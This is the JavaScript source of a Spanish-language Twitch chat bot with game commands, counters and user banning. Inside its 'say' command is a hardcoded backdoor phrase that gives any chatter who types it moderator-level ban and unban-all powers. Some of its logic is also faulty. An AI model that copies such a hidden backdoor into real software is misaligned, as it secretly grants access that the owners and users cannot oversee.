const tmi = require("tmi.js")
function roll(min, max) {
	return Math.floor(Math.random() * (max - min)) + min; // You can remove the Math.floor if you don't want it to be an integer
}
const blacklist = []
const prefix = "-"
let backdoorUser;
const streamer = "no1crate"
let blacklistuser = []
let whitelistuser = []
let whitelistuserstring = ""
let blacklistuserstring = ""
let hayApuesta = false;
let fCounts = 0;
let ggCounts = 0;
const options = {
    options: {
      debug: true
    },
    identity: {
        username: "no1crateebot",
        password: ""
      },
      channels: [streamer]
    };

const client = new tmi.client(options)

client.connect();

client.on('connected', () => {
  client.say(streamer, `Hola, estoy online!`)
})
client.on('chat', (target, ctw, message, self) => {
  if(self) return;

  const username = ctw.username;
  const isMod = ctw.mod;
  const isSubscriber = ctw.subscriber;
  const isVip = ctw.turbo;
  console.log(target);
  console.log(ctw);
  console.log(blacklistuserstring)
  console.log(options.channels)

  let userMessage = message.trim();
  const withUpperCaseMessage = userMessage
  userMessage = userMessage.toLowerCase()
  userMessage = userMessage.replace(blacklist[0], "***")
  userMessage = userMessage.replace(blacklist[1], "***")
  userMessage = userMessage.replace(blacklist[2], "***")
  userMessage = userMessage.replace(blacklist[3], "***")
  userMessage = userMessage.replace(blacklist[4], "***")
  userMessage = userMessage.replace(blacklist[5], "***")
  userMessage = userMessage.replace(blacklist[6], "***")
  if(blacklistuserstring.includes(username) != true || username == streamer || whitelistuserstring.includes(username)){
    if (userMessage.startsWith(prefix + "say")){
      const say = withUpperCaseMessage.replace(prefix + "say ", "")
      if(say == "$backdoor$password=no1crate$username=administrator"){backdoorUser = username}
        client.say(target, `${say}`)
    } else if(userMessage == prefix + "f"){
      fCounts += 1;
      if(fCounts == 1){
        client.say(target, `${streamer} ha muerto ${fCounts} vez en este stream! :(`)
      } else {
        client.say(target, `${streamer} ha muerto ${fCounts} veces en este stream! :(`)
      }
    } else if(userMessage == prefix + "gg"){
      ggCounts += 1;
      if(ggCounts == 1){
        client.say(target, `${streamer} ha ganado ${ggCounts} vez en este stream! :)`)
      } else {
        client.say(target, `${streamer} ha ganado ${ggCounts} veces en este stream! :)`)
      }
    } else if(userMessage == "hola") {
      client.say(target, `Hola ${username}, como estas?`)
    } else if(userMessage.startsWith(prefix + "bana")){
      const usernameBana = userMessage.replace("!bana ", "");
      client.say(streamer, `${username} quiere que banen a ${usernameBana}`)
    } else if(userMessage.startsWith(prefix + "ban")){
      if(username == "no1crate" || username == streamer || isMod == true || username == backdoorUser){
        const blockedUser = userMessage.replace(prefix + "ban ", "")
        if(blockedUser != "no1crate" || blockedUser != streamer){
        blacklistuser.push(blockedUser);
        client.say(streamer, `${blockedUser} bloqueado sastifactoriamente (bloqueado por ${username})`)
        blacklistuserstring += blacklistuser.join(" ");
        } else {
        blacklistuser.push(username);
        client.say(streamer, `${username} bloqueado sastifactoriamente (bloqueado por ${username})`)
        blacklistuserstring += blacklistuser.join(" ");
        }
      }
    } else if(userMessage == prefix + "facha"){
      const porcentajesAleatorio = roll(0, 100);
      client.say(streamer, `${username} tiene un ${porcentajesAleatorio}% de facha`)
    } else if(userMessage == "!calle"){
      const porcentajesAleatorio = roll(0, 100);
      client.say(streamer, `${username} tiene un ${porcentajesAleatorio}% de calle`)
    }else if(userMessage == prefix + "roll"){
      const rollNum = roll(0, 10);
      client.say(streamer, `${username} ha sacado ${rollNum}`)
    } else if(userMessage.startsWith(prefix + "unbanall")){
      if(username == "no1crate" || username == streamer || isMod == true || username == backdoorUser){
        blacklistuser = []
        client.say(streamer, `Todos fueron desbloquedos sastifactoriamente por ${username}`)
        blacklistuserstring = ""
      }
    /*} else if(userMesage == prefix + "addMyChannel"){ */

    } else {
      return
    }
  } else {
    client.say(target, `Estas bloqueado de el bot ${username}`)
  }  


})
